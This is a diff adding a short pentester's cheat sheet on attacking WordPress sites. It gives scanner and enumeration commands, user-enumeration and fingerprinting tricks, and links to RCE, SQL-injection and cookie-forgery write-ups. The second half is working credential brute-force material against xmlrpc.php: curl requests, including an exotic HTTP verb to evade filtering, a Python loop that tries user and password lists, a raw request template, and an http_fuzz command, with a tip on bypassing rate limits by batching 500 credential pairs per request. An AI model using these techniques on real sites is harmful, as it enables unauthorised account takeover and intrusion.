@@ -1,0 +1,74 @@
+# wordpress
+
+# scanners
+wpscan --url blah.com -e u,vt,vp (based on https://wpvulndb.com/)
+
+# fingerprint
+GET /readme.html
+./plecost/PKGBUILD:pkgdesc="Wordpress finger printer tool search and retrieve information about the plugins versions installed in Wordpress systems."
+
+# username enumeration
+?author=1
+
+# releases
+https://wordpress.org/news/category/releases/
+
+# xss in comments to rce (affected: 4.2, 4.1.2, 3.9.3 ...)
+http://klikki.fi/adv/wordpress2.html
+
+# rce
+http://vagosec.org/2013/12/wordpress-rce-exploit/
+
+# sqli + rce
+http://blog.checkpoint.com/2015/08/11/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-ii-supremacy/
+
+# cookie integrity fail CVE-2008-1930 <=2.5
+https://pentesterlab.com/exercises/cve-2008-1930/course
+
+# auth cookie forgery wordpress <3.7.2 & <3.8.2
+http://www.securitysift.com/understanding-wordpress-auth-cookies/
+https://labs.mwrinfosecurity.com/blog/2014/04/11/wordpress-auth-cookie-forgery/
+
+# bf login creds via /xmlrpc.php when wp-login.php is filtered
+# also you can send 500 l/p in one request to bypass rate limiting
+https://github.com/zendoctor/wpbrute-rpc
+https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html -> msf/auxiliary/scanner/http/wordpress_multicall_creds
+
+http://www.hsc-news.com/archives/2014/000123.html
+$ echo '<?xml version="1.0" encoding="iso-8859-1"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' > get_method.xml
+  List avail methods first (methods can be removed in the wp configuration)
+$ curl -v -H "User-Agent: Mozilla/5.0" -X POST -d @get_method.xml --url "http://cible.com/xmlrpc.php"
+
+ NB : si cette requête vous renvoie un code d'erreur (403, 400, 501,etc.),
+ outre les tests habituels avec les entêtes de provenances "X-*", vérifiez une
+ méthode exotique comme :
+
+$ curl -v -H "User-Agent: Mozilla/5.0" -X TOTO -d @get_method.xml --url "http://cible.com/xmlrpc.php"
+
+import xmlrpclib
+
+bruteForce(url,listUser, listPassword):
+ server = xmlrpclib.Server(url) #url = http://cible.com/xmlrpc.php
+ for user in listUser :
+   for pwd in listPassword :
+     param=['',user,pwd]
+     try:
+       res=server.blogger.getUserInfo(param)
+     except Exception as im :
+       pass
+     else:
+       print " Win \o/ : "+user+" : "+pwd
+
+or
+
+POST /xmlrpc.php HTTP/1.1
+Host: blah
+Accept-Encoding: gzip
+User-Agent: xmlrpclib.py/1.0.1 (by www.pythonware.com)
+Content-Type: text/xml
+Content-Length: 286
+
+<?xml version='1.0'?><methodCall><methodName>blogger.getUserInfo</methodName><params><param><value><array><data><value><string></string></value><value><string>admin</string></value><value><string><![CDATA[FILE0]]></string></value></data></array></value></param></params></methodCall>
+zombies use wp.getCategories 
+
+http_fuzz url='/xmlrpc.php' header='Content-Type: text/xml' method=POST body=@body.xml auto_urlencode=0 -x ignore:fgrep='Incorrect username or password'
